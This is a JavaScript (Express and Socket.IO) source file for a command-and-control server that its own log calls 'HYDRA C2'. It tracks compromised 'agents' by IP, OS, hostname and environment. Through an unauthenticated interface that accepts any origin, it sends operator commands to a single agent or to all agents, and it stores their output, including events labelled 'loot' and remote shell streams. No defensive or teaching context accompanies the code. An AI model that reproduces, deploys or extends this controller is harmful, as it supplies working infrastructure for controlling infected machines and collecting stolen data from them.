const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

let agents = [];
let eventHistory = [];

io.on('connection', (socket) => {
  console.log('New connection:', socket.id);

  socket.on('identify', (data) => {
    if (data.type === 'agent') {
        const existing = agents.find(a => a.id === data.id);
        if (existing) {
            existing.socketId = socket.id;
            existing.status = 'Online';
            existing.lastSeen = Date.now();
        } else {
            agents.push({
                socketId: socket.id,
                id: data.id || socket.id,
                ip: socket.handshake.address,
                os: data.os || 'Unknown',
                hostname: data.hostname || 'Unknown',
                status: 'Online',
                lastSeen: Date.now(),
                environment: data.environment || {}
            });
        }
        io.emit('agents_list', agents);
        console.log('Agent registered:', data.id);
    } else if (data.type === 'ui') {
        socket.join('ui_room');
        socket.emit('agents_list', agents);
        // Do not dump full history immediately to avoid UI lag, wait for request or send minimal
        socket.emit('history_dump', eventHistory.slice(-50)); 
    }
  });

  socket.on('heartbeat', (data) => {
     if (data && data.type === 'HEARTBEAT') {
         const agent = agents.find(a => a.id === data.agentId);
         if (agent) {
             agent.lastSeen = Date.now();
             agent.status = 'Online';
             // Only emit list if status changed to reduce spam
             // io.emit('agents_list', agents); 
         }
     }
  });

  socket.on('agent_chunk', (chunk) => {
     io.to('ui_room').emit('agent_event', chunk);
     
     // Store important events, skip raw streaming shell to save memory
     if (['SUCCESS', 'ERROR', 'loot', 'TELEMETRY'].includes(chunk.type)) {
         eventHistory.push({ ...chunk, timestamp: Date.now() });
         if (eventHistory.length > 1000) eventHistory.shift();
     }
  });
  
  socket.on('agent_event', (event) => {
     io.to('ui_room').emit('agent_event', event);
     eventHistory.push({ ...event, timestamp: Date.now() });
     if (eventHistory.length > 1000) eventHistory.shift();
  });

  socket.on('exec_cmd', (data) => {
    const { targetId, cmd } = data;
    console.log('Command received for', targetId, ':', cmd);
    const target = agents.find(a => a.id === targetId);
    if (target) {
        io.to(target.socketId).emit('command', { cmd });
    } else if (targetId === 'all') {
        agents.forEach(a => io.to(a.socketId).emit('command', { cmd }));
    }
  });

  socket.on('disconnect', () => {
    const agent = agents.find(a => a.socketId === socket.id);
    if (agent) {
        agent.status = 'Offline';
        io.emit('agents_list', agents);
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`HYDRA C2 Server running on port ${PORT}`);
});
